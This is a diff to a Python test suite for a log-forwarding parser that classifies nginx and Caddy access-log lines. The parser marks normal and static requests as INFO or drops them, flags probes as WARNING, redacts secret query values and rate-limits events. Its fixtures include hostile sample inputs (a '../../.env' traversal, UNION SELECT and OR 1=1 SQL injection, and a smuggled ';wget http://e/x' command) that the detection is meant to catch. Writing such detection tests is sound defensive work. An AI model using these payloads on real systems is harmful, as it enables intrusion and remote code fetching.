@@ -37,12 +37,16 @@ NGINX = {
     "probe_wp": '192.0.2.8 - - [15/Oct/2026:21:00:06 +0700] "POST /wp-login.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"',
     "probe_wpadmin": '192.0.2.8 - - [15/Oct/2026:21:00:06 +0700] "GET /wp-admin/setup-config.php HTTP/1.1" 403 0 "-" "Mozilla/5.0"',
 }
+# request ปกติ → INFO (HTTP_ALL_REQUESTS=true) · ทิ้งเมื่อ all_requests=False
 NGINX_NORMAL = [
     '203.0.113.9 - - [15/Oct/2026:21:00:07 +0700] "GET / HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Windows NT 10.0)"',
-    '203.0.113.9 - - [15/Oct/2026:21:00:07 +0700] "GET /assets/app.js HTTP/2.0" 200 9000 "https://x/" "Mozilla/5.0"',
     '203.0.113.9 - - [15/Oct/2026:21:00:07 +0700] "GET /missing HTTP/1.1" 404 0 "-" "Mozilla/5.0"',
     '203.0.113.9 - - [15/Oct/2026:21:00:07 +0700] "GET /.environment/status HTTP/1.1" 404 0 "-" "Mozilla/5.0"',
     '203.0.113.9 - - [15/Oct/2026:21:00:07 +0700] "GET /search?q=select+a+plan HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
+]
+# ไม่ใช่ access log / static asset → ทิ้งเสมอ
+NGINX_DROPPED = [
+    '203.0.113.9 - - [15/Oct/2026:21:00:07 +0700] "GET /assets/app.js HTTP/2.0" 200 9000 "https://x/" "Mozilla/5.0"',
     "not an access log line at all",
     "",
 ]
@@ -118,14 +122,27 @@ class AccessParserTest(unittest.TestCase):
         self.assertEqual(p["message"], 'GET /.env 404 "Mozilla/5.0 zgrab/0.x"')
         self.assertEqual(p["sourceIp"], "203.0.113.5")
 
-    def test_normal_requests_are_dropped(self):
+    def test_normal_requests_are_info(self):
         for line in NGINX_NORMAL:
+            with self.subTest(line):
+                p = parse_access(line)
+                self.assertEqual((p["severity"], p["eventType"], p["sourceIp"]), ("INFO", "HTTP_ACCESS", "203.0.113.9"))
+        self.assertEqual(parse_access(NGINX_NORMAL[0])["message"], 'GET / 200 "Mozilla/5.0 (Windows NT 10.0)"')
+        for line in NGINX_DROPPED:
             with self.subTest(line):
                 self.assertIsNone(parse_access(line))
 
+    def test_suspicious_only_mode_drops_normal_requests(self):
+        for line in NGINX_NORMAL:
+            with self.subTest(line):
+                self.assertIsNone(parse_access(line, all_requests=False))
+        for line in NGINX.values():
+            self.assertEqual(parse_access(line, all_requests=False)["severity"], "WARNING")
+
     def test_probe_path_needs_an_error_status(self):
         ok = NGINX["probe_git"].replace('" 404 ', '" 200 ')
-        self.assertIsNone(parse_access(ok))
+        self.assertEqual(parse_access(ok)["severity"], "INFO")
+        self.assertIsNone(parse_access(ok, all_requests=False))
 
     def test_cf_connecting_ip_only_when_trusted(self):
         line = NGINX["scanner"] + ' "198.51.100.77"'
@@ -178,6 +195,40 @@ class WebProxyFilterTest(unittest.TestCase):
         self.assertIsNone(parse_access(self.caddy("2001:db8::9", "/.env"), exclude=ex))
         self.assertIsNotNone(parse_access(self.caddy("49.48.73.183", "/.env"), exclude=ex))
 
+    def test_static_assets_are_dropped_unless_suspicious(self):
+        for uri in ("/_next/static/chunks/app-1a2b.js", "/_next/static/css/x.css", "/_next/image?url=%2Flogo.png&w=64",
+                    "/favicon.ico", "/logo.PNG?v=2", "/fonts/inter.woff2", "/manifest.json"):
+            with self.subTest(uri):
+                self.assertIsNone(parse_access(self.caddy("203.0.113.5", uri, status=200, ua="Mozilla/5.0")))
+        for uri in ("/", "/verify", "/api/v1/logs?limit=10", "/robots.txt", "/data.json"):
+            with self.subTest(uri):
+                self.assertEqual(parse_access(self.caddy("203.0.113.5", uri, 200, "Mozilla/5.0"))["severity"], "INFO")
+        for uri in ("/_next/static/../../.env", "/app.js?id=1%20UNION%20SELECT%201", "/x.png?f=;wget%20http://e/x"):
+            with self.subTest(uri):
+                self.assertEqual(parse_access(self.caddy("203.0.113.5", uri, 200, "Mozilla/5.0"))["severity"], "WARNING")
+        self.assertEqual(parse_access(self.caddy("203.0.113.5", "/favicon.ico", 200, "sqlmap/1.7"))["severity"], "WARNING")
+
+    def test_monitor_ua_is_dropped_unless_suspicious(self):
+        from logchain_forwarder.parsers import parse_ua_list
+        ua = parse_ua_list("Uptime-Kuma, Pingdom,")
+        self.assertEqual(ua, ("uptime-kuma", "pingdom"))
+        kuma = "Uptime-Kuma/2.2.1"
+        self.assertIsNone(parse_access(self.caddy("203.0.113.5", "/", 200, kuma), exclude_ua=ua))
+        self.assertEqual(parse_access(self.caddy("203.0.113.5", "/", 200, kuma))["severity"], "INFO")  # ไม่ได้ตั้ง = ส่ง
+        self.assertEqual(parse_access(self.caddy("203.0.113.5", "/.env", 404, kuma), exclude_ua=ua)["severity"], "WARNING")
+
+    def test_secret_query_values_are_redacted_on_info_only(self):
+        uri = "/api/auth/callback/keycloak?state=abc&session_state=s1&code=0a1b.c2d&iss=https%3A%2F%2Fkc"
+        p = parse_access(self.caddy("203.0.113.5", uri, 302, "Mozilla/5.0"))
+        self.assertEqual(p["severity"], "INFO")
+        self.assertEqual(
+            p["message"],
+            'GET /api/auth/callback/keycloak?state=***&session_state=***&code=***&iss=https%3A%2F%2Fkc 302 "Mozilla/5.0"',
+        )
+        self.assertIn("?q=1&token=***", parse_access(self.caddy("203.0.113.5", "/s?q=1&token=eyJx", 200, "Mozilla/5.0"))["message"])
+        attack = "/login?code=1%27%20OR%201=1--"
+        self.assertIn("code=1%27%20OR%201=1--", parse_access(self.caddy("203.0.113.5", attack, 200, "Mozilla/5.0"))["message"])
+
     def test_nginx_internal_ip_dropped_too(self):
         self.assertIsNone(parse_access(NGINX["scanner"].replace("203.0.113.5", "10.0.0.7")))
 
@@ -196,6 +247,20 @@ class GateTest(unittest.TestCase):
         now[0] = 3601
         self.assertTrue(g.admit(p(4)))  # ตัวแรกหลุดหน้าต่างแล้ว
         self.assertEqual(dict(g.counts), {"admitted": 4, "dropped_dedup": 1, "dropped_rate_cap": 1})
+
+    def test_info_cannot_use_the_warning_reserve(self):
+        g = Gate(per_hour=5, dedup_seconds=0, clock=lambda: 0.0, reserve_warning=2)
+        info = lambda i: {"source": "web-proxy", "severity": "INFO", "message": f"GET /{i}"}  # noqa: E731
+        warn = lambda i: {"source": "web-proxy", "severity": "WARNING", "message": f"GET /.env{i}"}  # noqa: E731
+        self.assertEqual([g.admit(info(i)) for i in range(5)], [True, True, True, False, False])
+        self.assertEqual([g.admit(warn(i)) for i in range(3)], [True, True, False])
+        self.assertEqual(dict(g.counts), {"admitted": 5, "dropped_info_cap": 2, "dropped_rate_cap": 1})
+
+    def test_dedup_is_per_source_ip(self):
+        g = Gate(per_hour=10, dedup_seconds=10, clock=lambda: 0.0)
+        p = lambda ip: {"source": "web-proxy", "sourceIp": ip, "severity": "INFO", "message": 'GET / 200 "x"'}  # noqa: E731
+        self.assertEqual([g.admit(p("203.0.113.5")), g.admit(p("198.51.100.9")), g.admit(p("203.0.113.5"))],
+                         [True, True, False])
 
 
 class FakeClient:
@@ -393,17 +458,25 @@ class StatsTest(unittest.TestCase):
                 line("49.48.73.182", "/.env"),            # IP เรา → ไม่ส่ง ไม่นับ IP
                 line("10.10.31.19", "/.env"),             # ภายใน
                 line("198.51.100.9", "/health", 200),     # health
+                line("203.0.113.5", "/_next/static/chunks/a.js", 200),  # static → ไม่ส่ง
+                line("203.0.113.5", "/", 200, ua="Uptime-Kuma/2.2.1"),   # monitor → ไม่ส่ง
                 "not json",
             ]) + "\n")
         with open(os.path.join(d, "access-2026-10-16T00-00-00.000.log"), "w") as f:
             f.write(line("198.51.100.9", "/x", 200, ua="sqlmap/1.7", ts=1792003600) + "\n")
-        r = access_stats([os.path.join(d, "access.log")], False, parse_networks("49.48.73.182"))
+        r = access_stats([os.path.join(d, "access.log")], False, parse_networks("49.48.73.182"),
+                         exclude_ua=("uptime-kuma",))
         self.assertEqual(len(r["files"]), 2)
-        self.assertEqual(r["requests"], 6)
+        self.assertEqual(r["requests"], 8)
+        self.assertEqual(r["dropped_monitor_ua"], 1)
         self.assertEqual(r["unique_external_ips"], 2)
-        self.assertEqual(r["would_send"], 2)
+        self.assertEqual(r["dropped_static"], 1)
+        self.assertEqual(r["would_send"], 3)
+        self.assertEqual(r["severity"], {"WARNING": 2, "INFO": 1})
         self.assertEqual(r["reasons"], {"probe-path": 1, "scanner-ua": 1})
         self.assertEqual(r["hours_covered"], 2)
+        old = access_stats([os.path.join(d, "access.log")], False, parse_networks("49.48.73.182"), all_requests=False)
+        self.assertEqual((old["would_send"], old["severity"]), (2, {"WARNING": 2}))
 
 
 class DetectionRulesTest(unittest.TestCase):
@@ -456,6 +529,25 @@ class DetectionRulesTest(unittest.TestCase):
             with self.subTest(name):
                 self.setUp()
                 self.assertEqual(self.ev(parse_access(NGINX[name])), rule)
+
+    def test_normal_requests_hit_no_rule(self):
+        # path จริงของ dashboard / Keycloak / API บน CT141 (query ลับถูกแทนด้วย *** ก่อนถึง detection)
+        uris = [
+            "/", "/logs", "/verify", "/alerts?status=OPEN", "/reports",
+            "/realms/logchain/protocol/openid-connect/auth?client_id=cylis-dashboard&scope=openid&response_type=code"
+            "&redirect_uri=https%3A%2F%2Flogchain.nareubad.work%2Fapi%2Fauth%2Fcallback%2Fkeycloak&state=x&prompt=login",
+            "/realms/logchain/login-actions/authenticate?session_code=abc&execution=e1&client_id=cylis-dashboard&tab_id=t1",
+            "/realms/logchain/protocol/openid-connect/token",
+            "/api/auth/callback/keycloak?state=s&session_state=ss&code=c",
+            "/api/v1/logs?limit=10&page=1", "/api/v1/batches/1d433a5d-52b1-4c3e-9420-211004614088/tree",
+            "/api/v1/stats/overview",
+        ]
+        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Safari/537.36"
+        for i, uri in enumerate(uris * 3):  # ซ้ำ 3 รอบ = ไม่มีกฎแบบนับครั้งตื่นด้วย
+            with self.subTest(uri):
+                p = parse_access(WebProxyFilterTest.caddy(None, "203.0.113.5", uri, 200, ua))
+                self.assertEqual(p["severity"], "INFO")
+                self.assertIsNone(self.ev(p))
 
 
 if __name__ == "__main__":
